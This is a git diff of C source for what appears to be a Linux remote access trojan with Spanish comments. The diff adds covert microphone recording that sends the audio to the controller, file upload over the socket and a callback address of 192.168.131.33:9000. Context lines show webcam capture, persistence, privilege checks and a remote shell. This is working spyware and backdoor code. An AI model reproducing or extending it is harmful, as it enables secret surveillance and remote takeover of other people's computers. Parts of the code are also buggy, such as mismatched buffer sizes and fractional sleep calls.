@@ -15,6 +15,7 @@
 #include "../src/base64.c"
 #include "../src/sysInfoLin.c"
 #include "../src/webcamLin.c"
+#include "../src/audioRecord.c"
 
 
 // Definiciones
@@ -23,10 +24,12 @@
 
 // Variables Globales 
 
+
 // Prototipos
 char *IsElevated();
 int mainLoop(int conn);
 int excndSend(int conn, char* cmd);
+int sendRawData(char *file, int conn);
 int readNdSndFle(int conn, char *file);
 void conection();
 void ash(int conn);
@@ -139,18 +142,6 @@ void ash(int conn){
     return;
 }
 
-/*void strtSnd(int conn, char *instruct){
-    char *file = malloc(strlen(instruct) + 1); // Asigna memoria a 'file'
-    char toReplace[] = "download ";
-
-    char *substr = strstr(instruct, toReplace);
-    size_t remainingLength = strlen(substr + strlen(toReplace));
-    memmove(file, substr + strlen(toReplace), remainingLength + 1);
-    readNdSndFle(conn, file);
-
-
-}
-*/
 int writeAndDecodeData(char *data, char *file){  
     char *base = basename(file);   
  
@@ -169,129 +160,39 @@ int writeAndDecodeData(char *data, char *file){
     return 0;   
 }
 
-/*int uploadFunc(char *command, int conn){
-    //Variables necesarias 
-    char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
-    memset(file, 0, strlen(command) + 1);
-    char toReplace[] = "upload ";
-    
-    char *substr = strstr(command, toReplace);   
-    size_t subLen = strlen(substr + strlen(toReplace));
-    memmove(file, substr + strlen(toReplace), subLen);
-    file[subLen] = '\0'; // Asegúrate de terminar la cadena con el carácter nulo.
-
-    
-    // Lógica para descargar archivos
-    char recvData[SOCKBUFF];  // Utilizamos un búfer para recibir datos
-    char *downloadedData = NULL;
-    size_t downloadedSize = 0;
-
-    // Inicializamos el búfer con valores nulos para evitar problemas con strcat
-    memset(recvData, 0, sizeof(recvData));
-
-    while (true) {
-        int bytesRead = recv(conn, recvData, SOCKBUFF, 0);
-         
-        if (bytesRead <= 0) {
-            // Manejo de error de recepción
-            send(conn, "Error en la recepción de datos.\n", strlen("Error en la recepción de datos.\n"), 0);
-            free(downloadedData);
-            free(file);
-            return 1;
-        }
-
-        if (strstr(recvData, "end\0") != NULL) {  
-            // Recibido el indicador de final "end\0"
-            break;
-        } else { 
-            // Añadir los datos recibidos al búfer de descarga
-            char *temp = realloc(downloadedData, downloadedSize + bytesRead);
-            if (temp == NULL) {
-                // Error de memoria
-                free(downloadedData);
-                free(file);
-                return 1;
-            }
-            downloadedData = temp;
-            memcpy(downloadedData + downloadedSize, recvData, bytesRead);
-            downloadedSize += bytesRead; 
-        }
-    }
- 
-    writeAndDecodeData(downloadedData, file);
-    sleep(0.3);
-    send(conn, "end\0", strlen("end\0"), 0);
-
-    free(downloadedData);
-    free(file);
-    return 0;
-}*/
 
 int uploadFunc(char* command, int conn) {
     // Encontrar nombre de base (NO RUTA COMPLETA)
-    char* base = basename(replaceFile(command, "upload "));
+    printf("\n\n%s", command);
+    char *base = basename(replaceFile(command, "upload "));
+
+    char fullBytesStr[100]; memset(fullBytesStr, 0, 100);
+    recv(conn, fullBytesStr, 100, 0);
+    long FullBytes = atoi(fullBytesStr);
+    printf("\n\n%ld\n\n", FullBytes);
 
     FILE* fp;
     fp = fopen(base, "wb");
 
     unsigned char recvData[SOCKBUFF];
-    size_t bytesRead;
+    size_t FullbytesRead = 0;
+    size_t bytesRead = 0;
 
-    while (true) {
+    while (FullBytes > FullbytesRead) {
         bytesRead = recv(conn, (char *)recvData, SOCKBUFF, 0);
         
-        if (strcmp((char *)recvData, "end\0") == 0)
-            break;
+        //if (strcmp((char *)recvData, "end\0") == 0)
+        //    break;
 
         fwrite(recvData, 1, bytesRead, fp);
         //fwrite(base64_decode(recvData, bytesRead, &bytesRead), 1, bytesRead, fp);
         memset(recvData, 0, SOCKBUFF);
-        
+        FullbytesRead += bytesRead;
     }
 
     fclose(fp);
 
 }
-
-/*int readNdSndFle(int conn, char *file){
-    setlocale(LC_ALL, "en_US.UTF-8");   
-
-    FILE *ptr;
-    // Abrimos el archivo en modo de lectura
-    ptr = fopen(file, "rb");
-
-    if (ptr == NULL) {
-        send(conn, "No se puede abrir el archivo.\n", strlen("No se puede abrir el archivo.\n"), 0);
-        sleep(0.3);
-        send(conn, "end\0", strlen("end\0"), 0);
-        return 1;
-    }
-
-    char buffer[SOCKBUFF];   
-
-    // Inicializamos los búferes con valores nulos
-    memset(buffer, 0, sizeof(buffer));
-
-    // Lee el archivo en búferes y codifícalo en Base64 antes de enviarlo
-    size_t bytesRead;
-
-    while ((bytesRead = fread(buffer, 1, SOCKBUFF, ptr)) > 0) {
-        long input_size = strlen(buffer); 
-        char *base64Encoded = base64_encode(buffer, input_size, &input_size);
-
-        send(conn, base64Encoded, strlen(base64Encoded), 0);
-        //printf("%s", base64Encoded);
-        free(base64Encoded);  // Liberar la memoria asignada por base64_encode
-    }
-
-
-    // Cierra el archivo
-    fclose(ptr);
-    sleep(0.3);
-    send(conn, "end\0", strlen("end\0"), 0); 
-    //printf("end");
-    return 0;
-}*/
 
 char* replaceFile(char* command, char* toReplace) {
     char* file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
@@ -423,7 +324,7 @@ int getPrstnc(int conn, char *method) {
         
 
         if (strcmp(IsElevated(), "yes") == 0){
-            char* path = copySource(conn, "high");  // Llama a copySource con el método "high"
+            char* path = copySource(conn, "high");  
 
             if (path == NULL) {
                 send(conn, "error", strlen("error"), 0);
@@ -456,8 +357,43 @@ int getPrstnc(int conn, char *method) {
     return 0;
 }
 
+int sendRawData(char *file, int conn){
+    long fullBytes = get_file_size(file);
+
+    if (fullBytes == -1){
+        send(conn, "error", strlen("error"), 0);
+        return 1;
+    }
+
+    char fullBytesStr[100];
+
+    sprintf(fullBytesStr, "%ld\0", fullBytes);   
+    send(conn, fullBytesStr, 100, 0);
+
+    FILE *fp = fopen(file, "rb");
+    
+
+    long bytesRead = 0;
+    char readData[2048];
+
+    while ((bytesRead = fread(readData, 1, SOCKBUFF, fp)) > 0){
+        readData[bytesRead] = '\0';
+        send(conn, readData, bytesRead, 0);
+        memset(readData, 0, 2048);
+    }
+    
+    fclose(fp);
+    sleep(0.4);
+    
+    //send(conn, "end\0", strlen("end\0"), 0); 
+    
+    remove(file);
+    return 0;
+}
+
 int mainLoop(int conn){
     char instruct[SOCKBUFF];
+
     while (true){
         memset(instruct, 0, SOCKBUFF);
         recv(conn, instruct, sizeof(instruct), 0); 
@@ -500,10 +436,13 @@ int mainLoop(int conn){
         } else if (strcmp(instruct, "video") == 0){
             startWeb(conn);
             sleep(0.5);
-            send(conn, "ending\0", strlen("ending\0"), 0);
-            //send(conn, base64_encode("end\0", strlen("end\0") + 1), 1024, 0);
+            //send(conn, "ending\0", strlen("ending\0"), 0);
+        
+        } else if (strcmp(instruct, "record") == 0){
+            char *filename = startRecord(conn);
+            sendRawData(filename, conn);
 
-        } else
+        }else
             continue;
     }
     return 0;
@@ -518,7 +457,7 @@ void conection(){
     
     cltAddr.sin_family = AF_INET;
     cltAddr.sin_port = htons(9000); // Especifcamos puerto 
-    cltAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Especificar DIRECCION IP
+    cltAddr.sin_addr.s_addr = inet_addr("192.168.131.33"); // Especificar DIRECCION IP
 
     int targetConnStatus 
         = connect(conn, (struct sockaddr*)&cltAddr, 
